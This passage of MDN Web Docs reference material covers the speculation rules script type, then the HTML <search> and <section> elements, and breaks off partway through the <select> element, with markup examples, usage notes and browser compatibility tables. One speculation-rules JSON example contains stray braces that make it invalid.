as long as it is still sufficiently strict for the cross-site case.\n\n**Note:** In the case of document rules, the matched link's specified referrer policy (e.g. using the [`referrerpolicy`](../../a#referrerpolicy) attribute) will be used, unless the rule specifies a policy that overrides it.\n\n[`\"relative_to\"`](#relative_to_2) Experimental  \nA string specifying where you want links matched by URL to be matched relative to. The value can be one of:\n\n[`document`](#document_2)  \nURLs should be matched relative to the document the speculation rules are being set on.\n\n[`ruleset`](#ruleset)  \nURLs should be matched relative to the file the rules are specified in. This is the default value.\n\nThis key setting is only relevant for rules defined in an external file (set using the [`Speculation-Rules`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Speculation-Rules) header). When rules are specified inside the same document they are being set for (i.e. in an inline `<script>` element), it makes no difference.\n\n[`\"requires\"`](#requires) Experimental  \nAn array of strings representing capabilities of the browser parsing the rule, which must be available if the rule is to be applied to the specified URLs.\n\n**Warning:** Prefetches will automatically fail in browsers that cannot meet a specified requirement, even if they support the [Speculation Rules API](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API).\n\nPossible values are:\n\n[`\"anonymous-client-ip-when-cross-origin\"`](#anonymous-client-ip-when-cross-origin)  \n(prefetch-only) Specifies that the rule matches only if the user agent can prevent the client IP address from being visible to the origin server if a cross-origin prefetch request is issued. Exactly how this works is dependent on browser implementation specifics. For example:\n\n- Chrome's implementation hides the IP address using a Google-owned proxy, therefore by default it only works for Google-controlled referrers (since in that case, sending the URLs of the destination to Google is not an additional privacy leak). When used on a non-Google-owned site, rules that include this will only match for users that turn on \"Enhanced preloading\" in `chrome://settings/preloading`.\n- Other Chromium-based browsers will have to provide their own solutions. Thorough testing in all target browsers is advised.\n- A future Safari implementation may possibly use something along the lines of [iCloud Private Relay](https://support.apple.com/en-us/102602).\n- A future Firefox implementation might use something based on the [Mozilla VPN](https://www.mozilla.org/en-US/products/vpn/) product.\n\n**Note:** As speculation rules use a `<script>` element, they need to be explicitly allowed in the [`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) directive if the site includes it. This is done by adding the `\"inline-speculation-rules\"` value along with a hash- or nonce-source.\n\n## Examples\n\n### Prefetch and prerender in the same set of rules\n\nThe basic examples shown in the description section included separate speculation rules defined for prefetch and prerender. It is possible to define both in a single set of rules:\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prefetch\": [\n      {\n        \"urls\": [\"next.html\", \"next2.html\"],\n        \"requires\": [\"anonymous-client-ip-when-cross-origin\"],\n        \"referrer_policy\": \"no-referrer\"\n      }\n    ],\n    \"prerender\": [\n      {\n        \"where\": { \"selector_matches\": \".product-link\" },\n        \"eagerness\": \"eager\"\n      }\n    ]\n  }\n</script>\n```\n\n**Note:** This code snippet provides a list (`\"urls\"`) rule and a document (`\"where\"`) rule example.\n\n### Multiple rule sets\n\nIt is also allowable to include multiple sets of rules in a single HTML file:\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prefetch\": [\n      {\n        \"urls\": [\"next.html\", \"next2.html\"],\n        \"requires\": [\"anonymous-client-ip-when-cross-origin\"],\n        \"referrer_policy\": \"no-referrer\"\n      }\n    ]\n  }\n</script>\n<script type=\"speculationrules\">\n  {\n    \"prerender\": [\n      {\n        \"where\": { \"selector_matches\": \".product-link\" },\n        \"eagerness\": \"eager\"\n      }\n    ]\n  }\n</script>\n```\n\nAnd multiple rules in a single result set:\n\njs\n\n```\n<script type=\"speculationrules\">\n{\n  \"prerender\": [\n    {\n      \"urls\": [\"one.html\"]\n    },\n    {\n      \"urls\": [\"two.html\"]\n    }\n  ]\n}\n</script>\n```\n\n### Dynamic rule insertion\n\nBelow is an example that feature detects speculation rules and, if supported, dynamically adds a prerender speculation rule via JavaScript:\n\njs\n\n```\nif (\n  HTMLScriptElement.supports &&\n  HTMLScriptElement.supports(\"speculationrules\")\n) {\n  const specScript = document.createElement(\"script\");\n  specScript.type = \"speculationrules\";\n  const specRules = {\n    prerender: [\n      {\n        urls: [\"/next.html\"],\n      },\n    ],\n  };\n  specScript.textContent = JSON.stringify(specRules);\n  console.log(\"added speculation rules to: next.html\");\n  document.body.append(specScript);\n}\n```\n\nYou can see this in action in this [prerender demos](https://prerender-demos.glitch.me/) page.\n\n### `where` syntax examples\n\nA document-sourced rule contains a `\"where\"` property, which is an object containing criteria that define which links in the document are matched. Effectively, the `\"where\"` object represents a test that is performed on every link on the page to see whether the speculation rule is applied to it.\n\nThe most basic version will match a single URL pattern or CSS selector:\n\njson\n\n```\n{ \"where\": { \"href_matches\": \"/next\" } }\n```\n\njson\n\n```\n{ \"where\": { \"selector_matches\": \".important-link\" } }\n```\n\n`\"href_matches\"` and `\"selector_matches\"` can also be set to an array of values, so multiple URL patterns or CSS selectors can be matched simultaneously:\n\njson\n\n```\n{ \"where\": { \"href_matches\": [\"/next\", \"/profile\"] } }\n```\n\njson\n\n```\n{ \"where\": { \"selector_matches\": [\".important-link\", \"#unique-link\"] } }\n```\n\nURL patterns and selectors can also contain wildcard (`*`) characters, allowing a single value to match multiple URLs. For example, the object below could match `user/`, `user/settings`, `user/stats`, etc.\n\njson\n\n```\n{ \"where\": { \"href_matches\": \"/user/*\" } }\n```\n\n[Search parameters (or query strings)](https://developer.mozilla.org/en-US/docs/Web/API/URL/search) can also be targeted in `href_matches`. For example, the object below could match all same-origin URLs with a `category` search parameter (as the first or a subsequent parameter):\n\njson\n\n```\n{ \"where\": { \"href_matches\": \"/*\\\\?*(^|&)category=*\" } }\n```\n\nAny condition can be negated by placing it inside a `\"not\"` condition — this means that, when matched, a link *won't* have the speculation rule applied to it, but when *not* matched, it *will*. The following example will cause all links that *don't* match the URL pattern `/logout` to have the rule applied to them, but not links that match `/logout`:\n\njson\n\n```\n{ \"where\": { \"not\": { \"href_matches\": \"/logout\" } } }\n```\n\n#### Combining multiple `\"where\"` conditions with `\"and\"` or `\"or\"`\n\nMultiple conditions can be combined inside `\"and\"` or `\"or\"` conditions — these take the value of arrays containing multiple conditions, all or any of which (respectively) have to match for the speculation rules to apply to a link. Using `\"and\"` or `\"or\"`, conditions can be nested multiple levels deep — there is no specified limit on allowed nesting levels.\n\nIt is useful to think of the `\"where\"` object as being equivalent to an `if` statement. So\n\n```\n{ and: [A, B, { or: [C, { not: D }] }] }\n```\n\nis equivalent to\n\n```\nif (A && B && (C || !D)) {\n  apply speculation rule\n}\n```\n\nIn the following complete speculation rule example, all same-origin pages are marked for prefetching except those known to be problematic — the `/logout` page, and any links marked up with a class of `.no-prerender`:\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prefetch\": [\n      {\n        \"where\": {\n          \"and\": [\n            { \"href_matches\": \"/*\" },\n            { \"not\": { \"href_matches\": \"/logout\" } },\n            { \"not\": { \"selector_matches\": \".no-prerender\" } }\n          ]\n        }\n      }\n    ]\n  }\n</script>\n```\n\n**Note:** The `where` pattern above does not include cross-site links, which are supported for prefetching (provided the user has no cookies set for the destination site, to protect against tracking) but not for prerendering.\n\n### `\"relative_to\"` example\n\nFor rule sets that are externally fetched (i.e. via the [`Speculation-Rules`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Speculation-Rules)) response header, URLs in list rules and URL patterns in document rules are parsed relative to the containing external text file's URL by default. To parse URLs in a list rule relative to the document's base URL, `\"relative_to\"` is used like this:\n\njson\n\n```\n{\n  \"urls\": [\"/home\", \"/about\"],\n  \"relative_to\": \"document\"\n}\n```\n\nFor document rules, `\"relative_to\"` can be paired directly with `\"href_matches\"` and the document's base URL would only be used for patterns in that particular condition:\n\njson\n\n```\n{\n  \"where\": {\n    \"or\": [\n      { \"href_matches\": \"/home\", \"relative_to\": \"document\" },\n      { \"href_matches\": \"/about\" }\n    ]\n  }\n}\n```\n\nIn the above example, only the first `\"href_matches\"` will be matched relative to the document's base URL.\n\n`relative_to` is mainly relevant if the speculation rules JSON file is on a different origin to the document you wish to apply them to:\n\n1.  If the document is located at `https://example.com/some/subpage.html` and the rules are at `https://example.com/resources/rules.json`, then `/home` always equates to `https://example.com/home` regardless of whether `relative_to` is set to `document` or `ruleset`.\n2.  However, if the document is located at `https://example.com/some/subpage.html` and the rules are at `https://other.example/resources/rules.json` (for example, on a third-party or cookieless resource origin), then:\n    - `\"relative_to\": \"document\"` will cause `/home` to equate to `https://example.com/home`.\n    - `\"relative_to\": \"ruleset\"` will cause `/home` to equate to `https://other.example/home`.\n\n    This is the typical use case for `\"relative_to\"`.\n3.  Another potential (but rarer) use case is when your URLs are specified in the form `home` instead of `/home`. If the document is located at `https://example.com/some/subpage.html` and the rules are at `https://example.com/resources/rules.json`, then:\n    - `\"relative_to\": \"document\"` would cause `home` to equate to `https://example.com/some/home`.\n    - `\"relative_to\": \"ruleset\"` would cause `home` to equate to `https://example.com/resources/home`.\n\n### `\"expects_no_vary_search\"` example\n\nConsider the case of a user directory landing page, `/users`, which has an `id` parameter added to bring up information on a specific user, for example `/users?id=345`. Whether this URL should be considered identical for caching purposes depends on the behavior of the application:\n\n1.  If this parameter has the effect of loading a completely new page containing the information for the specified user, then the URL should be cached separately.\n2.  If this parameter has the effect of highlighting the specified user on the same page, and perhaps revealing a pullout panel displaying their data, then the URL should be considered the same for caching purposes. This could result in performance improvements around the loading of the user pages and could be achieved via a [`No-Vary-Search`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/No-Vary-Search) with a value of `params=(\"id\")`.\n\nHow does this affect speculation rules? Consider the following code:\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prefetch\": [\n      {\n        \"urls\": [\"/users\"]\n      }\n    ]\n  }\n</script>\n<a href=\"/users?id=345\">User Bob</a>\n```\n\nWhat would happen in this case when the user starts a navigation to `/users?id=345` when the headers for the prefetch of `/users` have not been received yet? At this point, the browser doesn't know what the `No-Vary-Search` value will be, if anything. If there was no `No-Vary-Search` value set, and the application behavior was more like Option 1 above, the prefetch would be wasted and the browser would need to go and fetch the separate `/users?id=345` page from scratch.\n\nTo solve this, we can provide a hint as to what the page author expects the `No-Vary-Search` value to be. A speculation rule can have an `\"expects_no_vary_search\"` field, which contains a string representation of the expected header value:\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prefetch\": [\n      {\n        \"urls\": [\"/users\"],\n        \"expects_no_vary_search\": \"params=(\\\"id\\\")\"\n      }\n    ]\n  }\n</script>\n<a href=\"/users?id=345\">User Bob</a>\n```\n\nThis indicates that Option 2 described above is what the server is expected to produce. If a navigation starts while there is an ongoing prefetch of `/users`, this informs the browser that it is appropriate to wait for the prefetch, instead of immediately starting another fetch for `/users?id=345`.\n\nDocument rules can also be used in conjunction with `\"expects_no_vary_search\"`, depending on the pattern used. For example, in the case of:\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prefetch\": [\n      {\n        { \"where\": { \"href_matches\": \"/users?id=*\" } },\n        \"expects_no_vary_search\": \"params=(\\\"id\\\")\"\n      }\n    ]\n  }\n</script>\n<a href=\"/users?id=012\">User Bill</a>\n<a href=\"/users?id=345\">User Bob</a>\n<a href=\"/users?id=678\">User Ben</a>\n```\n\nIf a link is hovered over, the browser will start prefetching that specific link.\n\nIf the user hovers over another link before the prefetch completes, the `expects_no_vary_search` pattern tells the browser that there is no need to cancel the current prefetch, because all `/users` URLs with `id` URL parameter values effectively point to the same page for this context (and for caching purposes).\n\n### `eagerness` example\n\nThe following set of document rules shows how `eagerness` can be used to hint at the eagerness with which the browser should prerender each matching set of links.\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prerender\": [\n      {\n        \"where\": { \"href_matches\": \"/*\" },\n        \"eagerness\": \"conservative\"\n      },\n      {\n        \"where\": { \"selector_matches\": \".product-link\" },\n        \"eagerness\": \"eager\"\n      }\n    ]\n  }\n</script>\n```\n\nHere we are hinting that:\n\n- All same-site links contained in the document should be conservatively prerendered (i.e. when the user starts to activate them).\n- Any product links (in this case, those with a `class` of `.product-link`) in the document should be eagerly prerendered (i.e. if the user makes any kind of move towards navigating to them).\n\n**Note:** The effects of eagerness settings are less useful for list rules. By default, list rule URLs are prefetched/prerendered immediately as soon as the rules are parsed, which is what you'd expect — they are intended for explicit listing of high-priority URLs that you want to make available as soon as possible. For this reason, `eager` has the same effect as `immediate` in current implementations. Lower eagerness settings are for prefetching/prerendering when links are interacted with, and for these you are more likely to use document rules to find them on the page.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Prerender pages in Chrome for instant page navigations](https://developer.chrome.com/docs/web-platform/prerender-pages) on developer.chrome.com\n- [Speculative loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Speculative_loading)\n- [Speculation Rules API](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/speculationrules](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/speculationrules)"
- name: search
  summary: Since October 2023, this feature works across the latest devices and browser versions
  description: "# \\<search\\>: The generic search element\n\n## Baseline 2023\n\nNewly available\n\nSince October 2023, this feature works across the latest devices and browser versions. This feature might not work in older devices or browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fsearch&level=low)\n\nThe `<search>` [HTML](../index) element is a container representing the parts of the document or application with form controls or other content related to performing a search or filtering operation. The `<search>` element semantically identifies the purpose of the element's contents as having search or filtering capabilities. The search or filtering functionality can be for the website or application, the current web page or document, or the entire Internet or subsection thereof.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<search>` element is not for presenting search results. Rather, search or filtered results should be presented as part of the main content of that web page. That said, suggestions and links that are part of \"quick search\" functionality within the search or filtering functionality are appropriately nested within the contents of the `<search>` element as they are search features.\n\n## Accessibility\n\nThe `<search>` element defines a [`search`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/search_role) landmark. This removes the need for adding `role=search` to a [`<form>`](form) element.\n\n## Examples\n\n### Header search form\n\nThis example demonstrates the use of `<search>` as the container for a search within a website header to perform a simple site-wide search. The `<search>` is a semantic container for the [`<form>`](form) that submits the user-entered search query to a server.\n\n#### HTML\n\nhtml\n\n```\n<header>\n  <h1>Movie website</h1>\n  <search>\n    <form action=\"./search/\">\n      <label for=\"movie\">Find a Movie</label>\n      <input type=\"search\" id=\"movie\" name=\"q\" />\n      <button type=\"submit\">Search</button>\n    </form>\n  </search>\n</header>\n```\n\n#### Result\n\n### Web app search\n\nThis example demonstrates potential DOM content when dynamically including JavaScript search functionality in a web application. When search functionality is implemented entirely with JavaScript, if no form is submitted, neither a [`<form>`](form) element nor a submit [`<button>`](button) is required. For semantics, the `<search>` element is included to contain the search and filtering capabilities.\n\n#### HTML\n\nhtml\n\n```\n<search>\n  <label>\n    Find and filter your query\n    <input type=\"search\" id=\"query\" />\n  </label>\n  <label>\n    <input type=\"checkbox\" id=\"exact-only\" />\n    Exact matches only\n  </label>\n\n  <section>\n    <h3>Results:</h3>\n    <ul id=\"results\">\n      <!-- search result content -->\n    </ul>\n    <output id=\"no-results\">\n      <!-- no results content -->\n    </output>\n  </section>\n</search>\n```\n\n#### Result\n\n**Note:** Remember that some users don't have JavaScript, and none of your users have JavaScript running until the JavaScript is successfully downloaded, parsed, and executed, ensure your users can access the content of your site with JavaScript disabled.\n\n### Multiple searches\n\nThis example demonstrates a page with two search features. The first is a global site search located on the header. The second is a search and filter based on the page context, in our example a car search.\n\n#### HTML\n\nhtml\n\n```\n<body>\n  <header>\n    <h1>Car rental agency</h1>\n    <search title=\"Website\">...</search>\n  </header>\n  <main>\n    <h2>Cars available for rent</h2>\n    <search title=\"Cars\">\n      <h3>Filter results</h3>\n      ...\n    </search>\n    <article>\n      <!-- search result content -->\n    </article>\n  </main>\n</body>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------||\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [palpable content](../content_categories#palpable_content).                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| Permitted content                           | [Flow content](../content_categories#flow_content|\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Implicit ARIA role                          | [`search`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/search_role)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| Permitted ARIA roles                        | [`form`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/form_role), [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`region`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/region_role), [`search`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/search_role) |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `search` | 118     | 118  | 118     | 104   | 17     | 118            | 118                 | 79            | 17            | 25.0             | 118             |     |\n\n## See also\n\n- Other search-related elements: [`<header>`](header), [`<footer>`](footer), [`<aside>`](aside), [`<nav>`](nav), [`<form>`](form)\n- [ARIA: Search role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/search_role)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/search](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/search)"
- name: section
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<section\\>: The Generic Section element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fsection&level=high)\n\nThe `<section>` [HTML](../index) element represents a generic standalone section of a document, which doesn't have a more specific semantic element to represent it. Sections should always have a heading, with very few exceptions.\n\n## Try it\n\n#### HTML Demo: \\<section\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Choosing an Apple</h1>\n    <section>\n      <h2>Introduction</h2>\n      <p>This document provides a guide to help with the important task of choosing the correct Apple.</p>\n    </section>\n\n    <section>\n      <h2>Criteria</h2>\n      <p>\n        There are many different criteria to be considered when choosing an Apple — size, color, firmness, sweetness,\n        tartness...\n      </p>\n    </section>\n\n    h1,\n    h2 {\n      margin: 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nAs mentioned above, `<section>` is a generic sectioning element, and should only be used if there isn't a more specific element to represent it. As an example, a navigation menu should be wrapped in a [`<nav>`](nav) element, but a list of search results or a map display and its controls don't have specific elements, and could be put inside a `<section>`.\n\nAlso consider these cases:\n\n- If the contents of the element represent a standalone, atomic unit of content that makes sense syndicated as a standalone piece (e.g. a blog post or blog comment, or a newspaper article), the [`<article>`](article) element would be a better choice.\n- If the contents represent useful tangential information that works alongside the main content, but is not directly part of it (like related links, or an author bio), use an [`<aside>`](aside).\n- If the contents represent the main content area of a document, use [`<main>`](main).\n- If you are only using the element as a styling wrapper, use a [`<div>`](div) instead.\n\nTo reiterate, each `<section>` should be identified, typically by including a heading ([h1](heading_elements) - [h6](heading_elements) element) as a child of the `<section>` element, wherever possible. See below for examples of where you might see a `<section>` without a heading.\n\n## Examples\n\n### Simple usage example\n\n#### Before\n\nhtml\n\n```\n<div>\n  <h2>Heading</h2>\n  <p>Bunch of awesome content</p>\n</div>\n```\n\n##### Result\n\n#### After\n\nhtml\n\n```\n<section>\n  <h2>Heading</h2>\n  <p>Bunch of awesome content</p>\n</section>\n```\n\n##### Result\n\n### Using a section without a heading\n\nCircumstances where you might see `<section>` used without a heading are typically found in web application/UI sections rather than in traditional document structures. In a document, it doesn't really make any sense to have a separate section of content without a heading to describe its contents. Such headings are useful for all readers, but particularly useful for users of assistive technologies like screen readers, and they are also good for SEO.\n\nConsider however a secondary navigation mechanism. If the global navigation is already wrapped in a `<nav>` element, you could conceivably wrap a previous/next menu in a `<section>`:\n\nhtml\n\n```\n<section>\n  <a href=\"#\">Previous article</a>\n  <a href=\"#\">Next article</a>\n</section>\n```\n\nOr what about some kind of button bar for controlling your app? This might not necessarily want a heading, but it is still a distinct section of the document:\n\nhtml\n\n```\n<section>\n  <button class=\"reply\">Reply</button>\n  <button class=\"reply-all\">Reply to all</button>\n  <button class=\"fwd\">Forward</button>\n  <button class=\"del\">Delete</button>\n</section>\n```\n\n#### Result\n\nDepending on the content, including a heading could also be good for SEO, so it is an option to consider.\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------||\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [Sectioning content](../content_categories#sectioning_content), [palpable content](../content_categories#palpable_content|\n| Permitted content                           | [Flow content](../content_categories#flow_content).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content). Note that a `<section>` element must not be a descendant of an [`<address>`](address) element|\n| Implicit ARIA role                          | [`region`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/region_role) if the element has an [accessible name](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_name), otherwise [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role|\n| Permitted ARIA roles                        | [`alert`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/alert_role), [`alertdialog`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/alertdialog_role), [`application`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/application_role), [`banner`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/banner_role), [`complementary`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/complementary_role), [`contentinfo`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/contentinfo_role), [`dialog`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/dialog_role), [`document`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/document_role), [`feed`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/feed_role), [`log`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/log_role), [`main`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/main_role), [`marquee`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/marquee_role), [`navigation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/navigation_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`note`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/note_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`search`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/search_role), [`status`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/status_role), [`tabpanel`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tabpanel_role) |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement|\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `section` | 5       | 12   | 4       | 11.1  | 5      | 18             | 4                   | 11.1          | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- Other section-related elements: [`<body>`](body), [`<nav>`](nav), [`<article>`](article), [`<aside>`](aside), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<hgroup>`](hgroup), [`<header>`](header), [`<footer>`](footer), [`<address>`](address)\n- [Using HTML sections and outlines](heading_elements)\n- [ARIA: Region role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/region_role)\n- [Why You Should Choose HTML5 article Over section](https://www.smashingmagazine.com/2020/01/html5-article-section/), by Bruce Lawson\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/section](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/section)"
- name: select
  summary: The <select> HTML element represents a control that provides a menu of options
  description: "# \\<select\\>: The HTML Select element\n\nThe `<select>` [HTML](../index) element represents a control that provides a menu of options.\n\n## Try it\n\n#### HTML Demo: \\<select\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"pet-select\">Choose a pet:</label>\n\n    <select name=\"pets\" id=\"pet-select\">\n      <option value=\"\">--Please choose an option--</option>\n      <option value=\"dog\">Dog</option>\n      <option value=\"cat\">Cat</option>\n      <option value=\"hamster\">Hamster</option>\n      <option value=\"parrot\">Parrot</option>\n      <option value=\"spider\">Spider</option>\n      <option value=\"goldfish\">Goldfish</option>\n    </select>\n\n    label {\n      font-family: sans-serif;\n      font-size: 1rem;\n      padding-right: 10px;\n    }\n\n    select {\n      font-size: 0.9rem;\n      padding: 2px 5px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe above example shows typical `<select>` usage. It is given an `id` attribute to enable it to be associated with a [`<label>`](label) for accessibility purposes, as well as a `name` attribute to represent the name of the associated data point submitted to the server. Each menu option is defined by an [`<option>`](option) element nested inside the `<select>`.\n\nEach `<option>` element should have a [`value`](option#value) attribute containing the data value to submit to the server when that option is selected. If no `value` attribute is included, the value defaults to the text contained inside the element. You can include a [`selected`](option#selected) attribute on an `<option>` element to make it selected by default when the page first loads.\n\nA `<select>` element is represented in JavaScript by an [`HTMLSelectElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSelectElement) object, and this object has a [`value`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSelectElement/value) property which contains the value of the selected `<option>`.\n\nThe `<select>` element has some unique attributes you can use to control it, such as `multiple` to specify whether multiple options can be selected, and `size` to specify how many options should be shown at once. It also accepts most of the general form input attributes such as `required`, `disabled`, `autofocus`, etc.\n\nYou can further nest [`<option>`](option) elements inside [`<optgroup>`](optgroup) elements to create separate groups of options inside the dropdown. You can also include [`<hr>`](hr) elements to create separators that add visual breaks between options.\n\nFor further examples, see [The native form widgets: Drop-down content](https://developer.mozilla.org/en-US/docs/Learn/Forms/Other_form_controls#drop-down_controls).\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`autocomplete`](../attributes/autocomplete)  \nA string providing a hint for a [user agent's](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) autocomplete feature. See [The HTML autocomplete attribute](../attributes/autocomplete) for a complete list of values and details on how to use autocomplete.\n\n[`autofocus`](#autofocus)  \nThis Boolean attribute lets you specify that a form control should have input focus when the page loads. Only one form element in a document can have the `autofocus` attribute.\n\n[`disabled`](../attributes/disabled)  \nThis Boolean attribute indicates that the user cannot interact with the control. If this attribute is not specified, the control inherits its setting from the containing element, for example [`<fieldset>`](fieldset); if there is no containing element with the `disabled` attribute set, then the control is enabled.\n\n[`form`](#form)  \nThe [`<form>`](form) element to associate the `<select>` with (its *form owner*). The value of this attribute must be the [`id`](../global_attributes#id) of a `<form>` in the same document. (If this attribute is not set, the `<select>` is associated with its ancestor `<form>` element, if any.)\n\nThis attribute lets you associate `<select>` elements to `<form>`s anywhere in the document, not just inside a `<form>`. It can also override an ancestor `<form>` element.\n\n[`multiple`](../attributes/multiple)  \nThis Boolean attribute indicates that multiple options can be selected in the list. If it is not specified, then only one option can be selected at a time. When `multiple` is specified, most browsers will show a scrolling list box instead 